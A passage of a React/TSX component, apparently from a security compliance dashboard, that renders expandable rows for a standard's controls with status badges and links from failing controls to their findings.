          {activeStd.controls.map((control) => {
            const isExpanded = expandedControl === control.id
            const isFailing = control.status === "Failing"
            return (
              <div key={control.id} className="border border-border rounded-lg overflow-hidden bg-card/40">
                <button
                  onClick={() => setExpandedControl(isExpanded ? null : control.id)}
                  className="w-full flex items-center justify-between p-4 hover:bg-elevated/10 text-left transition-colors"
                >
                  <div className="flex items-center gap-3">
                    <span className="text-xs font-mono font-bold text-accent shrink-0">{control.id}</span>
                    <span className="text-xs font-bold text-ink">{control.title}</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span
                      className={`px-1.5 py-0.5 rounded text-[8px] font-bold uppercase tracking-wider ${
                        isFailing 
                          ? "bg-critical/10 text-critical border border-critical/20" 
                          : "bg-emerald/10 text-emerald border border-emerald/20"
                      }`}
                    >
                      {control.status}
                    </span>
                    <ChevronDown size={14} className={`text-ink-3 transition-transform ${isExpanded ? "rotate-180" : ""}`} />
                  </div>
                </button>
                {isExpanded && (
                  <div className="px-4 pb-4 pt-1 bg-canvas/30 space-y-3 text-xs leading-relaxed border-t border-border/40">
                    <p className="text-ink-2 font-sans">{control.desc}</p>
                    {isFailing && control.finding && (
                      <div className="bg-critical/5 border border-critical/10 rounded p-3 flex justify-between items-center mt-2">
                        <div className="flex items-center gap-2 text-[10px] text-critical font-bold">
                          <AlertTriangle size={11} className="shrink-0" />
                          <span>Violating active finding detected: {control.finding}</span>
                        </div>
                        <button
                          onClick={() => handleLinkToFinding(control.finding!)}
                          className="px-2.5 py-1 bg-critical text-white rounded text-[10px] font-semibold hover:bg-critical/90 transition-colors flex items-center gap-1"
                        >
                          <span>Review Finding</span>
                          <ExternalLink size={9} />
                        </button>
                      </div>
                    )}
                  </div>
                )}
              </div>
            )
          })}
        </div>
      </div>
    </div>
  )
}

